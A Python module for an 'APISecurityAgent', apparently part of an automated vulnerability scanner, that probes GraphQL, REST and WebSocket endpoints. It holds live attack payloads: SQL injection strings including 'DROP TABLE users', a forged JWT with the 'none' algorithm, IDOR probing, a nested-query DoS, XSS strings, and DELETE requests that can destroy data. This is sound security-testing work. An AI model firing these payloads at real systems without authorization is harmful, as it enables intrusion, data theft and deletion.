"""
API Security Agent - GraphQL, REST, and WebSocket Testing

Comprehensive API security testing covering:
- GraphQL introspection and injection
- REST endpoint fuzzing and authentication bypass
- JWT integration (works with JWTAgent)
- WebSocket security testing
- API rate limit bypass
- Mass assignment vulnerabilities

This gives BugTraceAI first-class API testing capabilities.
"""

import asyncio
import json
import re
from typing import List, Dict, Set, Optional, Any
from loguru import logger

import httpx

# Optional websockets support
try:
    import websockets
    WEBSOCKETS_AVAILABLE = True
except ImportError:
    WEBSOCKETS_AVAILABLE = False
    logger.warning("websockets module not available - WebSocket testing disabled")

from bugtrace.agents.base import BaseAgent
from bugtrace.core.llm_client import llm_client
from bugtrace.core.ui import dashboard
from bugtrace.core.config import settings
from bugtrace.core.event_bus import EventType


class APISecurityAgent(BaseAgent):
    """
    Specialized agent for modern API security testing.

    Attack Surface:
    1. GraphQL (introspection, injection, DoS)
    2. REST APIs (parameter fuzzing, IDOR, auth bypass)
    3. WebSocket (injection, auth bypass)
    4. API Documentation (Swagger/OpenAPI exposure)
    """

    def __init__(self, event_bus=None):
        super().__init__(
            "APISecurityAgent",
            "API & GraphQL Specialist",
            event_bus,
            agent_id="api_security"
        )
        self.graphql_endpoints: Set[str] = set()
        self.rest_endpoints: Set[str] = set()
        self.websocket_endpoints: Set[str] = set()
        self.findings: List[Dict] = []

    def _setup_event_subscriptions(self):
        """Subscribe to endpoint discovery and vulnerability events."""
        if self.event_bus:
            # Existing subscriptions
            self.event_bus.subscribe("api_endpoint_found", self.handle_api_endpoint)
            self.event_bus.subscribe("graphql_endpoint_found", self.handle_graphql_endpoint)

            # New Phase 20: Subscribe to specialist vulnerability_detected events
            self.event_bus.subscribe(
                EventType.VULNERABILITY_DETECTED.value,
                self.handle_vulnerability_detected
            )

            logger.info(f"[{self.name}] Subscribed to API and vulnerability events")

    async def handle_api_endpoint(self, data: Dict[str, Any]):
        """Triggered when REST API endpoint is discovered."""
        endpoint = data.get("url")
        self.think(f"New REST API endpoint: {endpoint}")
        await self._test_rest_endpoint(endpoint)

    async def handle_graphql_endpoint(self, data: Dict[str, Any]):
        """Triggered when GraphQL endpoint is discovered."""
        endpoint = data.get("url")
        self.think(f"New GraphQL endpoint: {endpoint}")
        await self._test_graphql_endpoint(endpoint)

    async def run_loop(self):
        """Main agent loop."""
        dashboard.current_agent = self.name
        self.think("API Security Agent initialized...")

        while self.running:
            await asyncio.sleep(1)

    # ==================== GRAPHQL TESTING ====================

    def _create_introspection_vuln(self, introspection_result: Dict) -> Dict:
        """Create vulnerability entry for GraphQL introspection."""
        return {
            "type": "GraphQL Introspection Enabled",
            "severity": "MEDIUM",
            "description": "Schema can be fully enumerated",
            "schema": introspection_result.get("schema")
        }

    def _create_injection_vuln(self, injection_result: Dict, endpoint: str) -> Dict:
        """Create vulnerability entry for GraphQL injection."""
        return {
            "type": "GraphQL Injection",
            "severity": "CRITICAL",
            "payload": injection_result["payload"],
            "response": injection_result["response"][:500],
            "description": f"GraphQL query injection vulnerability detected. Malicious payloads can manipulate query structure to access unauthorized data or execute unintended operations.",
            "reproduction": f"curl -X POST '{endpoint}' -H 'Content-Type: application/json' -d '{{\"query\": \"{injection_result['payload'][:100]}...\"}}'"
        }

    async def _test_graphql_endpoint(self, endpoint: str) -> Dict[str, Any]:
        """Comprehensive GraphQL security testing."""
        self.think(f"Testing GraphQL endpoint: {endpoint}")
        dashboard.log(f"🔍 GraphQL Testing: {endpoint}", "INFO")

        results = {"endpoint": endpoint, "vulnerabilities": []}

        # Test 1: Introspection
        introspection_result = await self._test_graphql_introspection(endpoint)
        if introspection_result["enabled"]:
            results["vulnerabilities"].append(self._create_introspection_vuln(introspection_result))

        # Test 2: Injection in queries
        injection_result = await self._test_graphql_injection(endpoint)
        if injection_result["vulnerable"]:
            results["vulnerabilities"].append(self._create_injection_vuln(injection_result, endpoint))

        # Test 3: Nested query DoS
        dos_result = await self._test_graphql_dos(endpoint)
        if dos_result["vulnerable"]:
            results["vulnerabilities"].append({
                "type": "GraphQL Nested Query DoS",
                "severity": "HIGH",
                "description": "Server accepts deeply nested queries without limit"
            })

        # Report findings
        for vuln in results["vulnerabilities"]:
            await self._report_finding(vuln)

        return results

    async def _test_graphql_introspection(self, endpoint: str) -> Dict:
        """Test if GraphQL introspection is enabled."""
        introspection_query = {
            "query": """
                query IntrospectionQuery {
                    __schema {
                        queryType { name }
                        mutationType { name }
                        types {
                            name
                            kind
                            fields {
                                name
                                type { name kind }
                            }
                        }
                    }
                }
            """
        }

        try:
            async with httpx.AsyncClient(timeout=10) as client:
                response = await client.post(
                    endpoint,
                    json=introspection_query,
                    headers={"Content-Type": "application/json"}
                )
                return self._graphql_parse_introspection_response(response)
        except Exception as e:
            logger.warning(f"GraphQL introspection test failed: {e}")
            return {"enabled": False}

    def _graphql_parse_introspection_response(self, response) -> Dict:
        """Parse GraphQL introspection response."""
        if response.status_code != 200:
            return {"enabled": False}

        data = response.json()
        if "data" not in data:
            return {"enabled": False}
        if "__schema" not in data.get("data", {}):
            return {"enabled": False}

        schema = data["data"]["__schema"]
        type_count = len(schema.get("types", []))

        dashboard.log(
            f"  ⚠️  GraphQL Introspection ENABLED: {type_count} types exposed",
            "CRITICAL"
        )

        return {
            "enabled": True,
            "schema": schema,
            "type_count": type_count
        }

    async def _test_graphql_injection(self, endpoint: str) -> Dict:
        """Test for injection vulnerabilities in GraphQL queries."""
        # Test SQLi-style injection in query variables
        injection_payloads = [
            {"id": "1' OR '1'='1"},
            {"id": "1; DROP TABLE users--"},
            {"search": "test' UNION SELECT password FROM users--"},
            {"user": {"id": "1", "role": "admin"}},  # Mass assignment
        ]

        for payload in injection_payloads:
            result = await self._graphql_test_single_injection(endpoint, payload)
            if result.get("vulnerable"):
                return result

        return {"vulnerable": False}

    async def _graphql_test_single_injection(self, endpoint: str, payload: Dict) -> Dict:
        """Test a single GraphQL injection payload."""
        query = {
            "query": "query GetUser($id: ID!) { user(id: $id) { id name email } }",
            "variables": payload
        }

        try:
            async with httpx.AsyncClient(timeout=10) as client:
                response = await client.post(endpoint, json=query)
                return self._graphql_check_injection_response(response, payload)
        except Exception as e:
            logger.debug(f"operation failed: {e}")
            return {"vulnerable": False}

    def _graphql_check_injection_response(self, response, payload: Dict) -> Dict:
        """Check GraphQL response for injection indicators."""
        error_patterns = [
            "sql", "mysql", "postgresql", "syntax error",
            "unclosed quotation", "unexpected", "exception"
        ]

        response_text = response.text.lower()
        if not any(pattern in response_text for pattern in error_patterns):
            return {"vulnerable": False}

        dashboard.log(
            f"  🚨 GraphQL Injection: Error-based vulnerability found!",
            "CRITICAL"
        )
        return {
            "vulnerable": True,
            "payload": json.dumps(payload),
            "response": response.text
        }

    async def _test_graphql_dos(self, endpoint: str) -> Dict:
        """Test for Nested Query DoS vulnerability."""
        # Create deeply nested query
        nested_query = {
            "query": """
                query {
                    user {
                        posts {
                            author {
                                posts {
                                    author {
                                        posts {
                                            comments {
                                                author { name }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            """
        }

        try:
            async with httpx.AsyncClient(timeout=15) as client:
                import time
                start_time = time.time()

                response = await client.post(endpoint, json=nested_query, timeout=15)
                duration = time.time() - start_time

                # If server takes >5s, likely vulnerable to query complexity DoS
                if duration > 5 or response.status_code == 500:
                    dashboard.log(
                        f"  ⚠️  GraphQL DoS: Server took {duration:.2f}s for nested query",
                        "HIGH"
                    )
                    return {"vulnerable": True, "duration": duration}
        except asyncio.TimeoutError:
            dashboard.log("  ⚠️  GraphQL DoS: Query timeout (15s)", "HIGH")
            return {"vulnerable": True, "duration": 15}
        except Exception as e:
            logger.debug(f"operation failed: {e}")

        return {"vulnerable": False}

    # ==================== REST API TESTING ====================

    async def _test_rest_endpoint(self, endpoint: str) -> Dict[str, Any]:
        """
        Comprehensive REST API testing.

        Tests:
        1. Authentication bypass
        2. IDOR (Insecure Direct Object Reference)
        3. Mass assignment
        4. HTTP verb tampering
        5. Rate limit bypass
        """
        self.think(f"Testing REST endpoint: {endpoint}")
        dashboard.log(f"🔍 REST API Testing: {endpoint}", "INFO")

        results = {"endpoint": endpoint, "vulnerabilities": []}

        # Test 1: Authentication bypass
        auth_bypass = await self._test_auth_bypass(endpoint)
        if auth_bypass["vulnerable"]:
            results["vulnerabilities"].append(auth_bypass)

        # Test 2: IDOR
        idor = await self._test_idor(endpoint)
        if idor["vulnerable"]:
            results["vulnerabilities"].append(idor)

        # Test 3: HTTP Verb Tampering
        verb_tamper = await self._test_http_verb_tampering(endpoint)
        if verb_tamper["vulnerable"]:
            results["vulnerabilities"].append(verb_tamper)

        # Report findings
        for vuln in results["vulnerabilities"]:
            await self._report_finding(vuln)

        return results

    async def _test_auth_bypass(self, endpoint: str) -> Dict:
        """Test authentication bypass techniques."""
        bypass_techniques = [
            # Remove authentication header
            {"headers": {}},
            # JWT "none" algorithm
            {"headers": {"Authorization": "Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9."}},
            # Empty Bearer token
            {"headers": {"Authorization": "Bearer "}},
            # Malformed token
            {"headers": {"Authorization": "Bearer invalid_token"}},
        ]

        try:
            async with httpx.AsyncClient(timeout=5) as client:
                return await self._auth_test_techniques(client, endpoint, bypass_techniques)
        except Exception as e:
            logger.debug(f"operation failed: {e}")
            return {"vulnerable": False}

    async def _auth_test_techniques(self, client, endpoint: str, bypass_techniques: List[Dict]) -> Dict:
        """Test all authentication bypass techniques."""
        # Get baseline response with no auth
        baseline = await client.get(endpoint, timeout=5)

        for technique in bypass_techniques:
            result = await self._auth_test_single_bypass(client, endpoint, baseline, technique)
            if result.get("vulnerable"):
                return result

        return {"vulnerable": False}

    async def _auth_test_single_bypass(self, client, endpoint: str, baseline, technique: Dict) -> Dict:
        """Test a single authentication bypass technique."""
        try:
            response = await client.get(endpoint, **technique, timeout=5)
            return self._auth_check_bypass_response(response, baseline, endpoint, technique)
        except Exception:
            return {"vulnerable": False}

    def _auth_check_bypass_response(self, response, baseline, endpoint: str, technique: Dict) -> Dict:
        """Check if authentication was bypassed."""
        # If we get 200 instead of 401/403, auth is bypassed
        if response.status_code != 200:
            return {"vulnerable": False}
        if baseline.status_code not in [401, 403]:
            return {"vulnerable": False}

        dashboard.log(
            f"  🚨 AUTH BYPASS: {endpoint} accessible without valid token!",
            "CRITICAL"
        )
        return {
            "vulnerable": True,
            "type": "Authentication Bypass",
            "severity": "CRITICAL",
            "technique": str(technique),
            "url": endpoint,
            "description": f"Authentication bypass vulnerability. The endpoint returns 200 OK without valid credentials using technique: {technique}. Original response was {baseline.status_code}.",
            "reproduction": f"curl -X GET '{endpoint}' # Returns 200 instead of 401/403"
        }

    def _create_idor_finding(self, endpoint: str, original_id: int, test_id: int, test_endpoint: str) -> Dict:
        """Create IDOR vulnerability finding."""
        return {
            "vulnerable": True,
            "type": "IDOR (Insecure Direct Object Reference)",
            "severity": "CRITICAL",
            "original_id": original_id,
            "accessible_id": test_id,
            "url": endpoint,
            "parameter": "id",
            "description": f"Insecure Direct Object Reference (IDOR) vulnerability. Changing ID from {original_id} to {test_id} returns different user data without authorization checks.",
            "reproduction": f"# Original: curl '{endpoint}'\n# IDOR: curl '{test_endpoint}'"
        }

    async def _test_idor(self, endpoint: str) -> Dict:
        """Test for Insecure Direct Object Reference."""
        id_pattern = r'/(\d+)(?:/|$)'
        match = re.search(id_pattern, endpoint)

        if not match:
            return {"vulnerable": False}

        original_id = int(match.group(1))
        test_ids = [original_id - 1, original_id + 1, 1, 999]

        try:
            async with httpx.AsyncClient(timeout=5) as client:
                return await self._idor_test_ids(client, endpoint, original_id, test_ids, id_pattern)
        except Exception as e:
            logger.debug(f"operation failed: {e}")
            return {"vulnerable": False}

    async def _idor_test_ids(self, client, endpoint: str, original_id: int, test_ids: List[int], id_pattern: str) -> Dict:
        """Test all ID values for IDOR vulnerability."""
        original_response = await client.get(endpoint, timeout=5)
        if original_response.status_code != 200:
            return {"vulnerable": False}

        original_data = original_response.text

        for test_id in test_ids:
            result = await self._idor_test_single_id(
                client, endpoint, original_id, test_id, original_data, id_pattern
            )
            if result.get("vulnerable"):
                return result

        return {"vulnerable": False}

    async def _idor_test_single_id(
        self, client, endpoint: str, original_id: int, test_id: int, original_data: str, id_pattern: str
    ) -> Dict:
        """Test a single ID for IDOR vulnerability."""
        if test_id == original_id:
            return {"vulnerable": False}

        test_endpoint = re.sub(id_pattern, f'/{test_id}/', endpoint)
        try:
            test_response = await client.get(test_endpoint, timeout=5)
            return self._idor_check_response(test_response, original_data, endpoint, original_id, test_id, test_endpoint)
        except Exception:
            return {"vulnerable": False}

    def _idor_check_response(
        self, test_response, original_data: str, endpoint: str, original_id: int, test_id: int, test_endpoint: str
    ) -> Dict:
        """Check IDOR test response."""
        if test_response.status_code != 200:
            return {"vulnerable": False}
        if test_response.text == original_data:
            return {"vulnerable": False}

        dashboard.log(f"  🚨 IDOR: Can access other user data at {test_endpoint}", "CRITICAL")
        return self._create_idor_finding(endpoint, original_id, test_id, test_endpoint)

    async def _test_http_verb_tampering(self, endpoint: str) -> Dict:
        """Test HTTP method override vulnerabilities."""
        # Try accessing with different HTTP methods
        methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]

        try:
            async with httpx.AsyncClient(timeout=5) as client:
                results_by_method = await self._verb_test_all_methods(client, endpoint, methods)
                return self._verb_check_tampering(endpoint, results_by_method)
        except Exception as e:
            logger.debug(f"operation failed: {e}")
            return {"vulnerable": False}

    async def _verb_test_all_methods(self, client, endpoint: str, methods: List[str]) -> Dict[str, int]:
        """Test all HTTP methods and collect status codes."""
        results_by_method = {}

        for method in methods:
            try:
                response = await client.request(method, endpoint, timeout=5)
                results_by_method[method] = response.status_code
            except Exception as e:
                logger.debug(f"operation failed: {e}")

        return results_by_method

    def _verb_check_tampering(self, endpoint: str, results_by_method: Dict[str, int]) -> Dict:
        """Check if DELETE verb tampering is present."""
        # Check for verb tampering (e.g., DELETE allowed when it shouldn't be)
        if "DELETE" not in results_by_method:
            return {"vulnerable": False}
        if results_by_method["DELETE"] not in [200, 204]:
            return {"vulnerable": False}

        dashboard.log(
            f"  ⚠️  HTTP Verb Tampering: DELETE method allowed on {endpoint}",
            "HIGH"
        )
        return {
            "vulnerable": True,
            "type": "HTTP Verb Tampering",
            "severity": "HIGH",
            "allowed_methods": list(results_by_method.keys()),
            "url": endpoint,
            "description": f"HTTP Verb Tampering vulnerability. The DELETE method is allowed on this endpoint, potentially allowing unauthorized resource deletion. Allowed methods: {list(results_by_method.keys())}",
            "reproduction": f"curl -X DELETE '{endpoint}' # Returns {results_by_method['DELETE']}"
        }

    # ==================== WEBSOCKET TESTING ====================

    async def _test_websocket(self, ws_url: str) -> Dict:
        """Test WebSocket security."""
        if not WEBSOCKETS_AVAILABLE:
            return {"accessible": False, "error": "websockets module not installed"}

        self.think(f"Testing WebSocket: {ws_url}")

        try:
            async with websockets.connect(ws_url, timeout=5) as websocket:
                # Test 1: Check if authentication is required
                test_message = json.dumps({"type": "ping", "data": "test"})
                await websocket.send(test_message)

                response = await asyncio.wait_for(websocket.recv(), timeout=3)

                dashboard.log(f"  📡 WebSocket connection established: {ws_url}", "INFO")

                # Test 2: Try injection payloads
                injection_payloads = [
                    {"type": "message", "content": "<script>alert(1)</script>"},
                    {"type": "message", "content": "' OR '1'='1"},
                ]

                for payload in injection_payloads:
                    await websocket.send(json.dumps(payload))

                return {"accessible": True, "authenticated": False}
        except Exception as e:
            logger.debug(f"operation failed: {e}")
            return {"accessible": False}

    # ==================== VULNERABILITY CORRELATION ====================

    async def handle_vulnerability_detected(self, data: Dict[str, Any]):
        """
        Handle vulnerability_detected events from specialist agents.

        Correlates specialist findings with API endpoints for deeper analysis:
        - SQLi findings on API endpoints -> test for GraphQL injection
        - IDOR findings -> test for broken object-level authorization
        - JWT findings -> integrate with API auth testing

        Args:
            data: Event data containing specialist, finding, status, scan_context
        """
        specialist = data.get("specialist", "unknown")
        finding = data.get("finding", {})
        status = data.get("status", "")
        url = finding.get("url", "")

        # Only process confirmed or pending findings
        if status not in ["VALIDATED_CONFIRMED", "PENDING_VALIDATION"]:
            return

        self.think(f"Received {specialist} finding for potential API correlation")

        # Correlate with API testing
        await self._correlate_with_api_testing(specialist, finding, url)

    async def _correlate_with_api_testing(self, specialist: str, finding: Dict, url: str):
        """
        Correlate specialist findings with API security testing.

        Args:
            specialist: The specialist that found the vulnerability
            finding: Finding details
            url: URL where vulnerability was found
        """
        if not url:
            return

        # Check if this URL is an API endpoint we're tracking
        is_rest = url in self.rest_endpoints
        is_graphql = url in self.graphql_endpoints

        if not is_rest and not is_graphql:
            # Check if URL looks like an API endpoint
            if self._is_api_url(url):
                # Add to tracked endpoints for future testing
                self.rest_endpoints.add(url)
                is_rest = True
                logger.info(f"[{self.name}] Added {url} to REST endpoints from {specialist} finding")

        # Trigger additional API-specific tests based on finding type
        if is_rest or is_graphql:
            await self._run_correlated_tests(specialist, finding, url, is_graphql)

    def _is_api_url(self, url: str) -> bool:
        """Check if URL looks like an API endpoint."""
        api_indicators = ["/api/", "/v1/", "/v2/", "/graphql", "/rest/", "/json", "/data/"]
        return any(indicator in url.lower() for indicator in api_indicators)

    async def _run_correlated_tests(self, specialist: str, finding: Dict, url: str, is_graphql: bool):
        """
        Run additional tests based on correlated specialist findings.

        Args:
            specialist: The specialist that found the vulnerability
            finding: Finding details
            url: API endpoint URL
            is_graphql: Whether this is a GraphQL endpoint
        """
        correlation_tests = {
            "sqli": self._correlate_sqli_with_api,
            "idor": self._correlate_idor_with_api,
            "jwt": self._correlate_jwt_with_api,
            "ssrf": self._correlate_ssrf_with_api,
        }

        handler = correlation_tests.get(specialist.lower())
        if handler:
            await handler(finding, url, is_graphql)

    async def _correlate_sqli_with_api(self, finding: Dict, url: str, is_graphql: bool):
        """Correlate SQLi finding with API - check for GraphQL injection."""
        if is_graphql:
            self.think(f"SQLi on GraphQL endpoint - testing GraphQL injection")
            # The GraphQL endpoint may have similar injection vulnerabilities
            # This is tracked for the next GraphQL test cycle
            self.findings.append({
                "type": "API Correlation",
                "correlation": "SQLi -> GraphQL",
                "original_finding": finding,
                "recommendation": "Test GraphQL queries for similar injection patterns"
            })

    async def _correlate_idor_with_api(self, finding: Dict, url: str, is_graphql: bool):
        """Correlate IDOR finding with API - check for BOLA."""
        self.think(f"IDOR on API endpoint - testing for BOLA (Broken Object Level Authorization)")
        # IDOR often indicates BOLA in REST APIs
        self.findings.append({
            "type": "API Correlation",
            "correlation": "IDOR -> BOLA",
            "original_finding": finding,
            "recommendation": "Test all object-access endpoints for authorization bypass"
        })

    async def _correlate_jwt_with_api(self, finding: Dict, url: str, is_graphql: bool):
        """Correlate JWT finding with API - check auth bypass."""
        self.think(f"JWT vulnerability on API - testing for auth bypass across endpoints")
        # JWT vulnerabilities can affect all authenticated endpoints
        self.findings.append({
            "type": "API Correlation",
            "correlation": "JWT -> API Auth Bypass",
            "original_finding": finding,
            "recommendation": "Test all authenticated API endpoints with forged tokens"
        })

    async def _correlate_ssrf_with_api(self, finding: Dict, url: str, is_graphql: bool):
        """Correlate SSRF finding with API - check for internal API access."""
        self.think(f"SSRF on API endpoint - testing for internal API access")
        # SSRF can be used to access internal APIs
        self.findings.append({
            "type": "API Correlation",
            "correlation": "SSRF -> Internal API Access",
            "original_finding": finding,
            "recommendation": "Test SSRF payloads targeting internal API endpoints"
        })

    # ==================== HELPERS ====================

    async def _report_finding(self, vulnerability: Dict):
        """Report discovered vulnerability."""
        self.findings.append(vulnerability)

        # Emit finding event
        if self.event_bus:
            await self.event_bus.emit("vulnerability_detected", {
                "agent": self.name,
                "vulnerability": vulnerability,
                "timestamp": logger._core.handlers[0]._sink._file.name
            })

        # Dashboard notification
        severity = vulnerability.get("severity", "MEDIUM")
        vuln_type = vulnerability.get("type", "Unknown")
        dashboard.log(f"  🚨 {severity}: {vuln_type}", severity)


# Export
__all__ = ["APISecurityAgent"]
